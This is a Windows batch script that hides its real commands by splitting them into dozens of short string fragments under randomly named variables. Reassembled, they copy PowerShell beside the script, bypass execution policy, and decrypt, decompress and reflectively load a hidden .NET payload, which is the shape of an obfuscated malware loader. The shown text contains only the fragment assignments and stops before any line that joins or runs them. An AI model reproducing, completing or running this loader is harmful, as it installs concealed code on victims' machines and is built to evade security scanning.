@echo off
set "IxLttoLDRs=ws"
set "fnfzBjWsnI=py"
set "CzIjQrObcP=rs"
set "OquOdInmux=he"
set "zYbdWdybjL=nd"
set "HaNdYAIsmV=he"
set "zldrtATmhZ=in"
set "vlWzrQNrVL=ll"
set "YnIDfKIfHK=co"
set "kWBOGxgnEh=\W"
set "WNcGyQgPlw=Po"
set "vpSSoBLLMX=do"
set "uVAqYvDIXy=ll"
set "MuBGybzKXe=rS"
set "ExfrdfxvCZ=y "
set "wReXgYetIq=we"
set "pwXuqYaoVF=s\"
set "OkKYcxWGQr=Sy"
set "djafohDsfr=ow"
set "HSocKQUlId=0\"
set "pMgMUrCjRa= /"
set "xVOGuuHzfC= C"
set "vXKNukTzuT=:\"
set "lnrxQcbGNY=em"
set "rwRgHISeaN=1."
set "ckgEXSzbcR=32"
set "MBDrBYiDJC=.e"
set "YnTdwVeIze=we"
set "LRqJPizOkE=st"
set "xQNzULmHiA=po"
set "szUzLPFwPg=Wi"
set "kddMGClvhw=\v"
set "XlEsTweaYG=xe"
set "uPuhvormcr= %~dp0"
set "ptbkXZbMzx=cd"
set "nAqICYSNiI=J, 0"
set "BJrLbTzWQs=:: '"
set "kkdlOKYdVg=..-1"
set "iIWwSYwqJE=$cxY"
set "CaFNUMsXdT=16] "
set "SWiscOqcoN=]::N"
set "SugCabWlfc=Syst"
set "RtFBRyCUIy=oL'["
set "iglWgCfGkW=('%*'"
set "iRLiRvaKZI=cxYx"
set "MzkpVnwdoP=ss -"
set "JTXXKjHfFH=oSZ."
set "MWtohpwYsr=xYxx"
set "xnwrRdMrpp=am ="
set "WvLKwPbvRD=[Sys"
set "uUeMtpPxas=and "
set "TpghKDCwvx=Star"
set "pkXhCEEsYM=d;$c"
set "ujOADttrEN=)($L"
set "pcYtWLsvdq=ress"
set "FxovWsVZKm= New"
set "pwolweXoYM=em.I"
set "EywjYINcFZ=x.Pa"
set "fouQRdhJts=ecry"
set "ljczbFbNhz=7;$c"
set "ASpJjCucuW=O.Me"
set "pdxwdNrtpQ== $c"
set "ZmbsbiOXtV= if "
set "ZkxSglmYif=YxVw"
set "deFaKTfvQv=.Mem"
set "VKAmOUntYA=('da"
set "XIJmxPLFaO=QJ ="
set "noFXllNKmw=m.Re"
set "cAnqHQYWVp=ert]"
set "mnvbsdaZQE=F'[-"
set "WddmbZTuXh=ect "
set "kfLxiWaHsM=$LZS"
set "xYSJCKFhwu=gjYA"
set "LhntKgodHS=th('"
set "zaPbdJZvDP=n ''"
set "yttqPnoCnk=rity"
set "snXtYCXJNE=J = "
set "hIdFUzQqjr=nirt"
set "kPeQRQQxkd=[Sys"
set "YgiGZDTJYJ=bstr"
set "YwFyhMjAwE=ose("
set "gjjezjpevC=S46e"
set "dxIvJSshGi=Disp"
set "KbmvffOPuM=tsWi"
set "BOgLPOWWct=V = "
set "JhwFqqDusu=tryP"
set "SbbLYQxmnw=.-16"
set "NbXNXiroYv=.GZi"
set "mQONANbgkr=tS46"
set "xLQWYjMAQA='0Pg"
set "RuKcGKLPfi=-Obj"
set "jYPxkoROTi=;$cL"
set "zRWXVbGfim=Comp"
set "enyWOxHKGL=;$gD"
set "PozfcFzcgB=k; }"
set "BdGKGAqcjZ=tion"
set "JIyHSzORQW=Stre"
set "FluqkDdnBW=rans"
set "FRZbUlyOzb= = $"
set "JQXHVOQvTW=J = "
set "nNpAMEWsaG=);$x"
set "uNPWIoYpTA=Mlwi"
set "nWFWVMbkWJ= '')"
set "bodNrSrXDe=ypto"
set "QQKgiEjTFe=$xCd"
set "sIODMKYuar=qoMu"
set "UxqdaMMAeJ=xYxx"
set "XYVXanLTME='[-1"
set "poMoYRuejP='txe"
set "AsIxivRLnJ= = $"
set "DqEqkCxRAp=pher"
set "YzsWIKDcWg=stem"
set "xhmdpqmKnN=[Env"
set "twZHLtzdFx=-1.."
set "dcqGRshiBQ=AD);"
set "XFuSXZVfut=.Dis"
set "opOdEkIVrL=y]::"
set "CxzwSUXdtJ=orF'"
set "IaglqaDyif=ion."
set "kfEtQCFhRN=m.IO"
set "FeQdNyqMEM=]::("
set "nCdRmjwTkP=rtS4"
set "HUUFPFXGRj=gMod"
set "gjKJbHMFkL=($rK"
set "VBBmqkoVyX=.Sec"
set "SqiUuZRlrr=e = "
set "XxZoWeBpYh=-4] "
set "RxjZKdtUwg=ew-O"
set "gVCBKkzdzv=]::C"
set "VCgEeCzUTo=).Sp"
set "BZdMfKZeHe=Obje"
set "zMlcwJXyPq=rKoS"
set "WMFFpzMWnS=();$"
set "nbLKbWytHf=$xCd"
set "gpCMwLmcVv=lit("
set "feqdnDlgMR=join"
set "JlSAPjlhWy=);$v"
set "gybiXgPlRQ= = ["
set "VIybZwdxvW=.Dis"
set "lgbLdHflKC=gsYZ"
set "jBBUoIYzWC=zuZI"
set "tSjUpSPcjM=t Sy"
set "ozPCWbJAtl=yBFx"
set "ivwXimSMJk=pStr"
set "uTZzEsvgOJ=raph"
set "XKSfNSIpfw=ECkQ"
set "sKJGioYBcS=;$vq"
set "SzJyUIGCSF=)) {"
set "npxSiZZWdN=tem."
set "UlkDiqPEAM=ne);"
set "oqLKJHbACE=y.Cr"
set "EuAkBYyPwc=ke($"
set "KiDfEqhiIe=pose"
set "kJFmFaMEou=Comp"
set "FXECWHsxCN=LZSQ"
set "yvuiHywApq=se()"
set "rhXtwfhTyo=vX.T"
set "NNTRtBbGCb=zHhH"
set "mKGsevXrrq=xx.I"
set "xtdwtpMuDd=stem"
set "kpQKsBwNyc='')("
set "MJOiFKzGhr=bypa"
set "zhtSdRZwun=.Cop"
set "rdVrbEEvSj=ring"
set "jOtUWxsoVb=esMa"
set "TxDghigxnE=:('g"
set "BLPKfLFlTg=rofi"
set "skXgtUqKgh=-ep "
set "TapiaiWSKy=[Sys"
set "mWojhAwONQ=106u"
set "SobMDKtqOB=.Com"
set "bfXAbFEVZQ=yTo("
set "KCRXtmFVKt=m.IO"
set "jjWjAiSWir=Disp"
set "DCrxEAWqMP=.Cre"
set "xAVObceUee=y.Ci"
set "EQYaGscFgZ=LZSQ"
set "vhHZAXEIDt=gth)"
set "LdWXCPRClE=yBFx"
set "SMyldtKgCT=Z.Su"
set "yqRgIJcNWM=PTtG"
set "ksKxXwPsEA=, (,"
set "DuYiNNEaiW=AD.T"
set "IdVANLKeyu=.Mod"
